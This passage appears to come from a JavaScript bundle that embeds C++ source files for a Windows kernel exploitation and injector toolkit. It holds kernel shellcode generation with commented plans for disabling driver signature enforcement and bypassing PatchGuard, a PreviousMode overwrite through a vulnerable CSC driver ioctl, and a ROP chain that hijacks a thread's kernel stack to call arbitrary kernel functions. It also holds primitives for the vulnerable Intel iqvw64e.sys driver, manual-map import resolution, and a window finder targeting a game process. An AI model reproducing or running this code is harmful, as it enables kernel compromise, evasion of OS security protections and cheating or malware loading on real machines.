    EmitQword(imports.ExAllocatePoolWithTag);

    // call rax
    EmitByte(0xFF);
    EmitByte(0xD0);

    // Now rax contains the allocated pool address
    // For verification, we could write a signature here
    // But for this POC, just allocating is enough to prove execution

    // In a real payload, you would:
    /*
    // 1. Disable DSE:
    //    - Find g_CiOptions or g_CiEnabled
    //    - Write 0 to disable signature checks

    // 2. Install hooks:
    //    - Find SSDT base
    //    - Save original function pointers
    //    - Replace with your hooks

    // 3. Load main driver:
    //    - Use ZwSetSystemInformation with SystemLoadGdiDriverInformation
    //    - Or manually map driver image

    // 4. Bypass PatchGuard:
    //    - Locate PatchGuard contexts
    //    - Modify them or install callbacks
    */
}

std::vector<BYTE> ShellcodeBuilder::BuildPayload() {
    shellcode.clear();

    LOG_INFO("Building kernel shellcode with resolved imports");

    // Generate the shellcode
    GeneratePrologue();
    GeneratePayloadLogic();
    GenerateEpilogue();

    LOG_SUCCESS("Shellcode built: %zu bytes", shellcode.size());

    // Print hex dump of shellcode (first 64 bytes)
    LOG_DEBUG("Shellcode hex dump:");
    for (size_t i = 0; i < min(shellcode.size(), (size_t)64); i += 16) {
        printf("  ");
        for (size_t j = i; j < min(i + 16, shellcode.size()); j++) {
            printf("%02X ", shellcode[j]);
        }
        printf("\\n");
    }

    return shellcode;
}
`,xh=`// hijack_window.cpp — enumerate top-level windows by process name + window class string for control-handle hijacking
// Source: D:/BackupFolder/hijack/hijack/hijack.cpp

#include <windows.h>\r
#include <iostream>\r
#include <string>\r
#include <tlhelp32.h>\r
\r
// Function to get the window class name of a process by name\r
std::string GetWindowClassNameByProcessName(const char* processName) {\r
    DWORD processId = 0;\r
\r
    // Create a snapshot of all processes\r
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\r
    if (snapshot == INVALID_HANDLE_VALUE) {\r
        std::cerr << "Failed to create process snapshot" << std::endl;\r
        return "";\r
    }\r
\r
    PROCESSENTRY32 pe32;\r
    pe32.dwSize = sizeof(PROCESSENTRY32);\r
\r
    // Find the process ID by name\r
    if (Process32First(snapshot, &pe32)) {\r
        do {\r
            if (strcmp(pe32.szExeFile, processName) == 0) {\r
                processId = pe32.th32ProcessID;\r
                break;\r
            }\r
        } while (Process32Next(snapshot, &pe32));\r
    }\r
    CloseHandle(snapshot);\r
\r
    if (processId == 0) {\r
        std::cerr << "Process " << processName << " not found" << std::endl;\r
        return "";\r
    }\r
\r
    std::cout << "Found " << processName << " with PID: " << processId << std::endl;\r
\r
    // Now find the window by process ID\r
    HWND hwnd = NULL;\r
    char className[256];\r
    char windowTitle[256];\r
\r
    // Enumerate all windows\r
    HWND currentWindow = GetTopWindow(NULL);\r
    while (currentWindow) {\r
        DWORD windowProcessId = 0;\r
        GetWindowThreadProcessId(currentWindow, &windowProcessId);\r
\r
        if (windowProcessId == processId) {\r
            // Get the class name\r
            GetClassName(currentWindow, className, sizeof(className));\r
            GetWindowText(currentWindow, windowTitle, sizeof(windowTitle));\r
\r
            std::cout << "\\nWindow Found:" << std::endl;\r
            std::cout << "  HWND: " << currentWindow << std::endl;\r
            std::cout << "  Class Name: " << className << std::endl;\r
            std::cout << "  Window Title: " << (windowTitle[0] ? windowTitle : "(No title)") << std::endl;\r
            std::cout << "  Visible: " << (IsWindowVisible(currentWindow) ? "Yes" : "No") << std::endl;\r
\r
            return std::string(className);\r
        }\r
\r
        currentWindow = GetNextWindow(currentWindow, GW_HWNDNEXT);\r
    }\r
\r
    std::cerr << "No window found for process " << processName << std::endl;\r
    return "";\r
}\r
\r
// Main function to demonstrate usage\r
int main() {\r
    std::cout << "Searching for PioneerGame.exe..." << std::endl;\r
\r
    std::string className = GetWindowClassNameByProcessName("PioneerGame.exe");\r
\r
    if (!className.empty()) {\r
        std::cout << "\\nSuccess! Class name: " << className << std::endl;\r
    }\r
    else {\r
        std::cout << "\\nFailed to find window class name" << std::endl;\r
        return 1;\r
    }\r
\r
    return 0;\r
}`,Eh=`// hvci_exploit.h — vulnerable-driver kernel R/W primitive: walk EPROCESS, locate target KTHREAD, ExpAllocateRowFromPool gadget
// Source: D:/BackupFolder/hvci/hvci/exploit.h

//\r
// exploit.h:\r
//\r
\r
#pragma once\r
\r
#define CSC_DEV_FCB_XXX_CONTROL_FILE            0x001401a3 // vuln ioctl\r
\r
bool ObtainKernelExploit(uintptr_t TargetKThread)\r
{\r
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");\r
\r
    if (!hNtdll)\r
    {\r
        printf("[-] Failed to obtain ntdll..\\n");\r
        getchar();\r
        exit(-1);\r
    }\r
\r
    NtReadVirtualMemory = (pNtReadVirtualMemory)GetProcAddress(hNtdll, "NtReadVirtualMemory");\r
    NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");\r
    NtFsControlFile = (PNtFsControlFile)GetProcAddress(hNtdll, "NtFsControlFile");\r
\r
    if (!NtReadVirtualMemory || !NtWriteVirtualMemory || !NtFsControlFile)\r
    {\r
        printf("[-] Failed to obtain required functions..\\n");\r
        getchar();\r
        exit(-1);\r
    }\r
\r
    HANDLE hHandle = NULL;\r
\r
    UNICODE_STRING  ObjectName = { 0 };\r
    OBJECT_ATTRIBUTES ObjectAttributes = { 0 };\r
    RtlInitUnicodeString(&ObjectName, L"\\\\Device\\\\Mup\\\\;Csc\\\\.\\\\.");\r
    InitializeObjectAttributes(&ObjectAttributes, &ObjectName, 0, NULL, NULL);\r
\r
    IO_STATUS_BLOCK IoStatusBlock = { 0 };\r
    auto Status = NtCreateFile(&hHandle, SYNCHRONIZE, &ObjectAttributes, &IoStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN_IF, FILE_CREATE_TREE_CONNECTION, NULL, 0);\r
    if (!NT_SUCCESS(Status))\r
    {\r
        printf("[-] NtCreateFile failed with status = %08x\\n", Status);\r
        getchar();\r
        exit(-1);\r
    }\r
\r
    Status = NtFsControlFile(hHandle, NULL, NULL, NULL, &IoStatusBlock, CSC_DEV_FCB_XXX_CONTROL_FILE, /*Vuln arg*/ reinterpret_cast<void*>(TargetKThread + KTHREAD_PreviousMode - 0x18), 0, NULL, 0);\r
    if (!NT_SUCCESS(Status))\r
    {\r
        printf("[-] NtFsControlFile failed with status: %08x\\n", Status);\r
        getchar();\r
        exit(-1);\r
    }\r
\r
    return true;\r
}\r
\r
ULONG64 GetEProcessViaPID(ULONG TargetProcessId)\r
{\r
    HANDLE hHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, TargetProcessId);\r
    return GetKernelObject(TargetProcessId, hHandle);\r
}\r
\r
ULONG64 GetCurrentEProcess()\r
{\r
    return GetEProcessViaPID(GetCurrentProcessId());\r
}\r
\r
ULONG64 GetCurrentKThread()\r
{\r
    HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, GetCurrentThreadId());\r
    return GetKernelObject(GetCurrentProcessId(), hThread);\r
}\r
\r
ULONG64 GetKThread(ULONG TargetProcessId, ULONG TargetThreadId)\r
{\r
    HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, TargetThreadId);\r
    return GetKernelObject(TargetProcessId, hThread);\r
}\r
\r
bool ReadKernelMemory(PVOID Source, PVOID Buffer, ULONG Size)\r
{\r
    size_t cbNumOfBytesRead = 0;\r
\r
    NTSTATUS Status = NtReadVirtualMemory(GetCurrentProcess(), Source, Buffer, Size, (PULONG)&cbNumOfBytesRead);\r
    if (!NT_SUCCESS(Status))\r
    {\r
        return false;\r
    }\r
\r
    return true;\r
}\r
bool WriteKernelMemory(PVOID Source, PVOID Buffer, ULONG Size)\r
{\r
    size_t cbNumOfBytesWrite = 0;\r
\r
    NTSTATUS Status = NtWriteVirtualMemory(GetCurrentProcess(), Source, &Buffer, Size, (PULONG)&cbNumOfBytesWrite);\r
\r
    if (!NT_SUCCESS(Status))\r
    {\r
        return false;\r
    }\r
    return true;\r
}`,yh=`// hvci_kforge.h — HVCI / VBS bypass via kernel-forge: PFN database manipulation to flip page protections under hypervisor-protected code integrity
// Source: D:/BackupFolder/hvci/hvci/kforge.h

//\r
// kforge.h:\r
//\r
\r
#pragma once\r
\r
#define THREAD_EXIT_CODE 0x1337\r
#define MAX_ARGS (4 + 9)\r
#define ARGS(_val_) ((PVOID)(_val_))\r
\r
namespace KF\r
{\r
    bool m_bInitialized = false;\r
    DWORD m_dwKernelSize = 0;\r
    DWORD m_dwKernelImageSize = NULL;\r
    PVOID m_ZwTerminateThread = NULL;\r
    PVOID m_RopAddr_1 = NULL, m_RopAddr_2 = NULL, m_RopAddr_3 = NULL, m_RopAddr_4 = NULL, m_RopAddr_5 = NULL;\r
\r
    bool ReadPointerWrapper(PVOID Addr, PVOID* Value)\r
    {\r
        // read single pointer from virtual memory address\r
        return ReadKernelMemory(Addr, Value, sizeof(PVOID));\r
    }\r
\r
    bool WritePointerWrapper(PVOID Addr, PVOID Value)\r
    {\r
        // write single pointer at virtual memory address\r
        return WriteKernelMemory(Addr, Value, sizeof(PVOID));\r
    }\r
\r
    bool Initialize()\r
    {\r
        char szKernelName[MAX_PATH], szKernelPath[MAX_PATH];\r
\r
        if (m_bInitialized) {\r
            return true;\r
        }\r
\r
        PVOID data = nullptr;\r
        DWORD dwDataSize = 0;\r
        PIMAGE_NT_HEADERS pHeaders;\r
        PIMAGE_SECTION_HEADER pSection;\r
\r
        if (!GetKernelImageInfo(reinterpret_cast<PVOID*>(&m_KernelAddr), &m_dwKernelSize, szKernelName)) {\r
            return false;\r
        }\r
\r
        GetSystemDirectoryA(szKernelPath, MAX_PATH);\r
        strcat_s(szKernelPath, "\\\\");\r
        strcat_s(szKernelPath, szKernelName);\r
\r
        if (ReadFromFile(szKernelPath, &data, &dwDataSize))\r
        {\r
            if (LdrMapImage(data, dwDataSize, &m_KernelImage, &m_dwKernelImageSize)) {\r
                LdrProcessRelocs(m_KernelImage, reinterpret_cast<PVOID>(m_KernelAddr));\r
            }\r
            LocalFree(data);\r
        }\r
        else {\r
            goto _end;\r
        }\r
\r
        if (!m_KernelImage) {\r
            goto _end;\r
        }\r
\r
        pHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(\r
            RVATOVA(m_KernelImage, reinterpret_cast<PIMAGE_DOS_HEADER>(m_KernelImage)->e_lfanew)\r
            );\r
\r
        pSection = reinterpret_cast<PIMAGE_SECTION_HEADER>(\r
            RVATOVA(&pHeaders->OptionalHeader, pHeaders->FileHeader.SizeOfOptionalHeader)\r
            );\r
\r
        for (DWORD i = 0; i < pHeaders->FileHeader.NumberOfSections; ++i)\r
        {\r
            if ((pSection->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0 &&\r
                (pSection->Characteristics & IMAGE_SCN_MEM_DISCARDABLE) == 0) {\r
                for (DWORD n = 0; n < pSection->Misc.VirtualSize - 0x100; ++n) {\r
                    DWORD ptr = pSection->VirtualAddress + n;\r
\r
                    // Signature of nt!_guard_retpoline_exit_indirect_rax() used as\r
                    // ROP gadget to control function argument registers\r
                    UCHAR sign1[] = { 0x48, 0x8b, 0x44, 0x24, 0x20,  // mov     rax, [rsp+0x20]\r
                                     0x48, 0x8b, 0x4c, 0x24, 0x28,  // mov     rcx, [rsp+0x28]\r
                                     0x48, 0x8b, 0x54, 0x24, 0x30,  // mov     rdx, [rsp+0x30]\r
                                     0x4c, 0x8b, 0x44, 0x24, 0x38,  // mov     r8, [rsp+0x38]\r
                                     0x4c, 0x8b, 0x4c, 0x24, 0x40,  // mov     r9, [rsp+0x40] \r
                                     0x48, 0x83, 0xC4, 0x48,        // add     rsp, 48h\r
                                     0x48, 0xFF, 0xE0 };             // jmp     rax\r
\r
                    // Match the signature\r
                    if (MatchSign(RVATOVA(m_KernelImage, ptr), sign1, sizeof(sign1))) {\r
                        // Calculate an actual kernel address\r
                        m_RopAddr_1 = RVATOVA(m_KernelAddr, ptr);\r
                    }\r
\r
                    // ROP gadget used to reserve an extra space for the stack arguments\r
                    UCHAR sign2[] = { 0x48, 0x83, 0xC4, 0x68,  // add     rsp, 68h\r
                                     0xC3 };                   // retn\r
\r
                    // Match the signature\r
                    if (MatchSign(RVATOVA(m_KernelImage, ptr), sign2, sizeof(sign2))) {\r
                        // Calculate an actual kernel address                        \r
                        m_RopAddr_2 = RVATOVA(m_KernelAddr, ptr);\r
                    }\r
\r
                    // RCX control ROP gadget to use in pair with the next one\r
                    UCHAR sign3[] = { 0x59,  // pop     rcx\r
                                     0xC3 }; // retn\r
\r
                    // Match the signature\r
                    if (MatchSign(RVATOVA(m_KernelImage, ptr), sign3, sizeof(sign3))) {\r
                        // Calculate an actual kernel address\r
                        m_RopAddr_3 = RVATOVA(m_KernelAddr, ptr);\r
                    }\r
\r
                    // ROP gadget used to save forged function call return value\r
                    UCHAR sign4[] = { 0x48, 0x89, 0x01,  // mov     [rcx], rax\r
                                     0xC3 };            // retn\r
\r
                    // Match the signature\r
                    if (MatchSign(RVATOVA(m_KernelImage, ptr), sign4, sizeof(sign4))) {\r
                        // Calculate an actual kernel address\r
                        m_RopAddr_4 = RVATOVA(m_KernelAddr, ptr);\r
\r
                        // Dummy gadget for stack alignment\r
                        m_RopAddr_5 = RVATOVA(m_KernelAddr, ptr + 3);\r
                    }\r
                }\r
            }\r
            pSection++;\r
        }\r
\r
        if (!m_RopAddr_1 || !m_RopAddr_2 || !m_RopAddr_3 || !m_RopAddr_4 || !m_RopAddr_5) {\r
            goto _end;\r
        }\r
\r
        printf("[+] ROP1: %p\\n", m_RopAddr_1);\r
        printf("[+] ROP2: %p\\n", m_RopAddr_2);\r
        printf("[+] ROP3: %p\\n", m_RopAddr_3);\r
        printf("[+] ROP4: %p\\n", m_RopAddr_4);\r
        printf("[+] ROP5: %p\\n", m_RopAddr_5);\r
\r
        // Get address of nt!ZwTerminateThread(), needed to gracefully shutdown our dummy thread with messed up kernel stack\r
        if ((m_ZwTerminateThread = GetKernelZwProcAddress("ZwTerminateThread")) == nullptr) {\r
            goto _end;\r
        }\r
\r
        m_bInitialized = true;\r
\r
    _end:\r
\r
        if (!m_bInitialized) {\r
            if (m_KernelImage) {\r
                LocalFree(m_KernelImage);\r
                m_KernelImage = nullptr;\r
                m_dwKernelImageSize = 0;\r
            }\r
        }\r
\r
        return m_bInitialized;\r
    }\r
\r
    bool Cleanup()\r
    {\r
        if (m_KernelImage) {\r
            LocalFree(m_KernelImage);\r
            m_KernelImage = NULL;\r
            m_dwKernelImageSize = 0;\r
        }\r
\r
        m_bInitialized = false;\r
        return true;\r
    }\r
\r
    DWORD WINAPI dummyThread(LPVOID lpParam) {\r
        HANDLE hEvent = lpParam;\r
        WaitForSingleObject(hEvent, INFINITE);\r
        return 0;\r
    }\r
\r
    bool CallKernelFunctionViaAddress(PVOID ProcAddr, PVOID* Args, DWORD dwArgsCount, PVOID* pRetVal)\r
    {\r
        BOOL bRet = FALSE;\r
        HANDLE hThread = NULL, hEvent = NULL;\r
        PVOID RetVal = NULL;\r
        DWORD dwThreadId = 0;\r
        PUCHAR StackBase = NULL, KernelStack = NULL;\r
        PVOID RetAddr = NULL;\r
        PUCHAR Ptr;\r
        PVOID pThread;\r
\r
        if (!m_bInitialized)\r
            return FALSE;\r
\r
        if (dwArgsCount > MAX_ARGS)\r
            return FALSE;\r
\r
        // Create waitable event\r
        if ((hEvent = CreateEvent(NULL, FALSE, FALSE, NULL)) == NULL)\r
            goto _end;\r
\r
        // Create dummy thread\r
        if ((hThread = CreateThread(NULL, 0, dummyThread, hEvent, 0, &dwThreadId)) == NULL)\r
            goto _end;\r
\r
        while (true) {\r
            // Determine current state of dummy thread\r
            DWORD State = GetThreadState(GetCurrentProcessId(), dwThreadId);\r
            if (State == -1)\r
                goto _end;\r
\r
            if (State == Waiting)\r
                break;\r
\r
            SwitchToThread();\r
        }\r
\r
        // Get _KTHREAD address by handle\r
        pThread = GetObjectAddress(hThread);\r
        if (pThread == NULL)\r
            goto _end;\r
\r
        // Get stack base of the thread\r
        if (!ReadPointerWrapper(RVATOVA(pThread, KTHREAD_StackBase), (PVOID*)&StackBase))\r
            goto _end;\r
\r
        // Get stack pointer of the thread\r
        if (!ReadPointerWrapper(RVATOVA(pThread, KTHREAD_KernelStack), (PVOID*)&KernelStack))\r
            goto _end;\r
\r
        RetAddr = NULL;\r
        Ptr = StackBase - sizeof(PVOID);\r
\r
        // Walk over the kernel stack\r
        while (Ptr > KernelStack) {\r
            DWORD_PTR Val = 0;\r
\r
            // Read stack value\r
            if (!ReadPointerWrapper(Ptr, (PVOID*)&Val))\r
                goto _end;\r
\r
            /*\r
                Check for the return address from system call handler back to\r
                the nt!KiSystemServiceCopyEnd(), it's located at the bottom\r
                of the kernel stack.\r
            */\r
            if (Val > m_KernelAddr &&\r
                Val < m_KernelAddr + m_dwKernelSize) {\r
                RetAddr = Ptr;\r
                break;\r
            }\r
\r
            // Go to the next stack location\r
            Ptr -= sizeof(PVOID);\r
        }\r
\r
        if (RetAddr == NULL)\r
            goto _end;\r
\r
#define WRITE_STACK(_offset_, _val_)                                                         \\\r
    if (!WritePointerWrapper(RVATOVA(RetAddr, (_offset_)), (PVOID)(_val_))) {                       \\\r
        goto _end;                                                                          \\\r
    }\r
\r
        // Hijack the return address with forged function call\r
        WRITE_STACK(0x00, m_RopAddr_1);\r
\r
        // Save an address for the forged function call\r
        WRITE_STACK(0x08 + 0x20, ProcAddr);\r
\r
        if (dwArgsCount > 0)\r
            WRITE_STACK(0x08 + 0x28, Args[0]);  // 1st argument goes in RCX\r
\r
        if (dwArgsCount > 1)\r
            WRITE_STACK(0x08 + 0x30, Args[1]);  // 2nd argument goes in RDX\r
\r
        if (dwArgsCount > 2)\r
            WRITE_STACK(0x08 + 0x38, Args[2]);  // 3rd argument goes in R8\r
\r
        if (dwArgsCount > 3)\r
            WRITE_STACK(0x08 + 0x40, Args[3]);  // 4th argument goes in R9\r
\r
        // Reserve shadow space and 9 stack arguments\r
        WRITE_STACK(0x50, m_RopAddr_2);\r
\r
        for (DWORD i = 4; i < dwArgsCount; ++i)\r
            WRITE_STACK(0x58 + 0x20 + ((i - 4) * sizeof(PVOID)), Args[i]);  // The rest arguments go over the stack right after the shadow space\r
\r
        // Obtain RetVal address\r
        WRITE_STACK(0xc0, m_RopAddr_3);\r
        WRITE_STACK(0xc8, &RetVal);\r
\r
        // Save return value of the forged function call\r
        WRITE_STACK(0xd0, m_RopAddr_4);\r
\r
        // Dummy gadget for stack alignment\r
        WRITE_STACK(0xd8, m_RopAddr_5);\r
\r
        // Put the next function call\r
        WRITE_STACK(0xe0, m_RopAddr_1);\r
\r
        // Forge nt!ZwTerminateThread() function call\r
        WRITE_STACK(0xe8 + 0x20, m_ZwTerminateThread);\r
        WRITE_STACK(0xe8 + 0x28, hThread);\r
        WRITE_STACK(0xe8 + 0x30, THREAD_EXIT_CODE);\r
\r
        SwitchToThread();\r
\r
    _end:\r
\r
        if (hEvent && hThread) {\r
            DWORD dwExitCode = 0;\r
\r
            // Put thread into the ready state\r
            SetEvent(hEvent);\r
            WaitForSingleObject(hThread, INFINITE);\r
\r
            GetExitCodeThread(hThread, &dwExitCode);\r
\r
            // Check for the magic exit code set by forged call\r
            if (dwExitCode == THREAD_EXIT_CODE) {\r
                if (pRetVal) {\r
                    // Return value of the function\r
                    *pRetVal = RetVal;\r
                }\r
                bRet = TRUE;\r
            }\r
        }\r
\r
        if (hEvent)\r
            CloseHandle(hEvent);\r
\r
        if (hThread)\r
            CloseHandle(hThread);\r
\r
        return bRet;\r
    }\r
\r
    bool CallKernelFunctionViaName(const char* lpszProcName, PVOID* Args, DWORD dwArgsCount, PVOID* pRetVal)\r
    {\r
        PVOID FuncAddr = NULL;\r
\r
        if ((FuncAddr = GetKernelProcAddress(lpszProcName)) == NULL) {\r
            if (!strncmp(lpszProcName, "Zw", 2)) {\r
                FuncAddr = GetKernelZwProcAddress(lpszProcName);\r
            }\r
        }\r
\r
        if (FuncAddr == NULL) {\r
            return FALSE;\r
        }\r
\r
        return CallKernelFunctionViaAddress(FuncAddr, Args, dwArgsCount, pRetVal);\r
    }\r
\r
    // specialized for no return type\r
    template<typename... Args>\r
    void smartNoRetCall(const char* kernelFunctionName, Args... args)\r
    {\r
        PVOID argsArray[] = { ARGS(args)... };\r
        CallKernelFunctionViaName((char*)kernelFunctionName, argsArray, sizeof...(args), NULL);\r
    }\r
\r
    template<typename RetType, typename... Args>\r
    RetType CallKernelFunctionViaName(const char* kernelFunctionName, Args... args)\r
    {\r
        PVOID argsArray[] = { ARGS(args)... };\r
\r
        PVOID pRet = nullptr;\r
        BOOL bResult = CallKernelFunctionViaName((char*)kernelFunctionName, argsArray, sizeof...(args), &pRet);\r
\r
        if (bResult) {\r
            return (RetType)pRet;\r
        }\r
        else {\r
            return RetType();\r
        }\r
    }\r
\r
    PVOID ExAllocatePool(POOL_TYPE PoolType, SIZE_T Size)\r
    {\r
        return CallKernelFunctionViaName<PVOID, POOL_TYPE, SIZE_T>("ExAllocatePool", PoolType, Size);\r
    }\r
}`,Sh=`// iat_patch.cpp — kernel-assisted IAT resolution over IMAGE_IMPORT_DESCRIPTOR chain
// Source: desktop 3-15/injector-master/Loader/core/mmaps.cpp  (MapImageImportDescriptor)

std::uintptr_t GetRemoteImageExport(std::uintptr_t image, const std::string& name)
{
    auto& driver = io::DriverControl::Instance();
    if (!image) return 0;

    const auto image_dos_header = driver.Read<IMAGE_DOS_HEADER>(image);
    if (image_dos_header.e_magic != IMAGE_DOS_SIGNATURE) return 0;

    const auto image_nt_headers = driver.Read<IMAGE_NT_HEADERS>(image + image_dos_header.e_lfanew);
    if (image_nt_headers.Signature != IMAGE_NT_SIGNATURE) return 0;

    const auto& dir_export = image_nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dir_export.VirtualAddress || !dir_export.Size) return 0;

    auto export_buf = std::make_unique<std::uint8_t[]>(dir_export.Size);
    if (!driver.ReadMemory(image + dir_export.VirtualAddress, export_buf.get(), dir_export.Size))
        return 0;

    const auto ied = PIMAGE_EXPORT_DIRECTORY(export_buf.get());
    const auto displacement = std::uintptr_t(export_buf.get()) - dir_export.VirtualAddress;

    const auto addr_of_fns    = reinterpret_cast<std::uint32_t*>(displacement + ied->AddressOfFunctions);
    const auto addr_of_names  = reinterpret_cast<std::uint32_t*>(displacement + ied->AddressOfNames);
    const auto addr_of_ords   = reinterpret_cast<std::uint16_t*>(displacement + ied->AddressOfNameOrdinals);

    for (auto i = 0ul; i < ied->NumberOfNames; i++)
    {
        const auto export_name = std::string(PCHAR(displacement + addr_of_names[i]));
        if (core::ToLower(export_name) == core::ToLower(name))
            return (image + addr_of_fns[addr_of_ords[i]]);
    }
    return 0;
}

bool MapImageImportDescriptor(std::uintptr_t image)
{
    auto& driver = io::DriverControl::Instance();

    const auto image_nt_headers = GetImageNtHeaders(image);
    if (!image_nt_headers) return false;

    const auto import_dir = image_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (!import_dir.VirtualAddress || !import_dir.Size) return true;

    auto import_descriptor = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(
        image + import_dir.VirtualAddress);

    while (import_descriptor && import_descriptor->Name)
    {
        const auto mod_name      = reinterpret_cast<const char*>(image + import_descriptor->Name);
        const auto mod_name_wide = core::ToWideString(mod_name);
        const auto mod_base      = driver.GetImage(mod_name_wide.c_str());

        if (mod_base)
        {
            auto thunk_data = reinterpret_cast<IMAGE_THUNK_DATA*>(
                image + import_descriptor->FirstThunk);

            while (thunk_data && thunk_data->u1.AddressOfData)
            {
                if (!(thunk_data->u1.Ordinal & IMAGE_ORDINAL_FLAG64))
                {
                    const auto ibn = reinterpret_cast<IMAGE_IMPORT_BY_NAME*>(
                        image + thunk_data->u1.AddressOfData);
                    const auto proc = GetRemoteImageExport(mod_base, ibn->Name);

                    if (proc)
                    {
                        TRACE("%s: %s: [0x%016llX]", __FUNCTION__, ibn->Name, proc);
                        thunk_data->u1.Function = proc;
                    }
                }
                thunk_data++;
            }
        }
        import_descriptor++;
    }
    return true;
}
`,Mh=`// intel_exploit.cpp — Intel iqvw64e.sys exploit primitives (MmMapLockedPages / MmAllocatePagesForMdl)
// Source: D:/BackupFolder/desktop 1114/injector-master/Loader/kernelutility/Intel2.cpp

}

BOOLEAN bDataCompare(const BYTE* pData, const BYTE* bMask, const char* szMask) {
	for (; *szMask; ++szMask, ++pData, ++bMask)
		if (*szMask == 'x' && *pData != *bMask)
			return 0;
	return (*szMask) == 0;
}

uintptr_t FindPattern(uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, char* szMask) {
	size_t max_len = dwLen - strlen(szMask);
	for (uintptr_t i = 0; i < max_len; i++)
		if (bDataCompare((BYTE*)(dwAddress + i), bMask, szMask))
			return (uintptr_t)(dwAddress + i);
	return 0;
}

PVOID FindSection(char* sectionName, uintptr_t modulePtr, PULONG size) {
	size_t namelength = strlen(sectionName);
	PIMAGE_NT_HEADERS headers = (PIMAGE_NT_HEADERS)(modulePtr + ((PIMAGE_DOS_HEADER)modulePtr)->e_lfanew);
	PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(headers);
	for (DWORD i = 0; i < headers->FileHeader.NumberOfSections; ++i) {
		PIMAGE_SECTION_HEADER section = &sections[i];
		if (memcmp(section->Name, sectionName, namelength) == 0 &&
			namelength == strlen((char*)section->Name)) {
			if (!section->VirtualAddress) {
				return 0;
			}
			if (size) {
				*size = section->Misc.VirtualSize;
			}
			return (PVOID)(modulePtr + section->VirtualAddress);
		}
	}
	return 0;
}

bool intel_driver2::MemCopy(HANDLE device_handle, uint64_t destination, uint64_t source, uint64_t size) {
	if (!destination || !source || !size)
		return 0;

	COPY_MEMORY_BUFFER_INFO copy_memory_buffer = { 0 };

	copy_memory_buffer.case_number = 0x33;
	copy_memory_buffer.source = source;
	copy_memory_buffer.destination = destination;
	copy_memory_buffer.length = size;

	DWORD bytes_returned = 0;
	return DeviceIoControl(device_handle, ioctl1, &copy_memory_buffer, sizeof(copy_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
}

bool intel_driver2::SetMemory(HANDLE device_handle, uint64_t address, uint32_t value, uint64_t size) {
	if (!address || !size)
		return 0;

	FILL_MEMORY_BUFFER_INFO fill_memory_buffer = { 0 };

	fill_memory_buffer.case_number = 0x30;
	fill_memory_buffer.destination = address;
	fill_memory_buffer.value = value;
	fill_memory_buffer.length = size;

	DWORD bytes_returned = 0;
	return DeviceIoControl(device_handle, ioctl1, &fill_memory_buffer, sizeof(fill_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
}

bool intel_driver2::GetPhysicalAddress(HANDLE device_handle, uint64_t address, uint64_t* out_physical_address) {
	if (!address)
		return 0;

	GET_PHYS_ADDRESS_BUFFER_INFO get_phys_address_buffer = { 0 };

	get_phys_address_buffer.case_number = 0x25;
	get_phys_address_buffer.address_to_translate = address;

	DWORD bytes_returned = 0;

	if (!DeviceIoControl(device_handle, ioctl1, &get_phys_address_buffer, sizeof(get_phys_address_buffer), nullptr, 0, &bytes_returned, nullptr))
		return false;

	*out_physical_address = get_phys_address_buffer.return_physical_address;
	return true;
}

uint64_t intel_driver2::MapIoSpace(HANDLE device_handle, uint64_t physical_address, uint32_t size) {
	if (!physical_address || !size)
		return 0;

	MAP_IO_SPACE_BUFFER_INFO map_io_space_buffer = { 0 };

	map_io_space_buffer.case_number = 0x19;
	map_io_space_buffer.physical_address_to_map = physical_address;
	map_io_space_buffer.size = size;

	DWORD bytes_returned = 0;

	if (!DeviceIoControl(device_handle, ioctl1, &map_io_space_buffer, sizeof(map_io_space_buffer), nullptr, 0, &bytes_returned, nullptr))
		return 0;

	return map_io_space_buffer.return_virtual_address;
}

bool intel_driver2::UnmapIoSpace(HANDLE device_handle, uint64_t address, uint32_t size) {
	if (!address || !size)
		return false;

	UNMAP_IO_SPACE_BUFFER_INFO unmap_io_space_buffer = { 0 };

	unmap_io_space_buffer.case_number = 0x1A;
	unmap_io_space_buffer.virt_address = address;
	unmap_io_space_buffer.number_of_bytes = size;

	DWORD bytes_returned = 0;

	return DeviceIoControl(device_handle, ioctl1, &unmap_io_space_buffer, sizeof(unmap_io_space_buffer), nullptr, 0, &bytes_returned, nullptr);
}

bool intel_driver2::ReadMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size) {
	return MemCopy(device_handle, reinterpret_cast<uint64_t>(buffer), address, size);
}

bool intel_driver2::WriteMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size) {
	return MemCopy(device_handle, address, reinterpret_cast<uint64_t>(buffer), size);
}

bool intel_driver2::WriteToReadOnlyMemory(HANDLE device_handle, uint64_t address, void* buffer, uint32_t size) {
	if (!address || !buffer || !size)
		return false;

	uint64_t physical_address = 0;

	if (!GetPhysicalAddress(device_handle, address, &physical_address)) {
		//Log(L"[-] Failed to translate virtual address 0x" << reinterpret_cast<void*>(address) << std::endl);
		return false;
	}

	const uint64_t mapped_physical_memory = MapIoSpace(device_handle, physical_address, size);

	if (!mapped_physical_memory) {
		//Log(L"[-] Failed to map IO space of 0x" << reinterpret_cast<void*>(physical_address) << std::endl);
		return false;
	}

	bool result = WriteMemory(device_handle, mapped_physical_memory, buffer, size);

#if defined(DISABLE_OUTPUT)
	UnmapIoSpace(device_handle, mapped_physical_memory, size);
#else
	if (!UnmapIoSpace(device_handle, mapped_physical_memory, size))
		//Log(L"[!] Failed to unmap IO space of physical address 0x" << reinterpret_cast<void*>(physical_address) << std::endl);
#endif


	return result;
}

/*added by psec*/
